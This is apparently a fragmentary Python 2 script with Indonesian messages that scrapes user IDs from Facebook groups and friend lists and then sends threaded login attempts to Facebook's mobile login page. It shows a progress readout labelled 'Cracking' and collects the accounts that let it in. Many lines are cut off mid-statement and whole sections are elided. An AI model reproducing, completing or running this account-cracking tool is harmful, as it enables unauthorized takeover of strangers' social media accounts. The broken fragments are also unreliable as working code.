...
tampil( '\rm[!] kamu menggunakan python versi %s silahkan menggunakan versi 2.x.x' % v().split( ' '
os.sys.exit()
...
br.addheaders = [( 'User-Agent' ,'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Ve
def bacaData():
...
tampil( '\rh[*]Selamat datang \rk %s\n\rh[*]Semoga ini adalah hari keberuntungan mu....' %
log = 1
z = open( "log.txt" , "w" )
z.write( "USERNAME : " )
z.write(us)
...
a = buka( 'https://m.facebook.com/browse/group/members/?id=' +id_group +'&amp;start=0&amp;
...
if log == 0:
keluar()
saring_id_teman(buka( 'https://m.facebook.com/friends/center/friends/?fb_ref=fbm&ref_component=m
try :
...
def run (self):
try :
data = urllib2.urlopen(urllib2.Request( url = 'https://m.facebook.com/login.php' ,data= urllib.
...
print ('\r\033[32;1m[*]Cracking \033[31;1m[\033[36;1m %0.2f%s \03
os.sys.stdout.flush()
akun_jml.append(a[ 1 ])
except KeyboardInterrupt:
os.sys.exit()
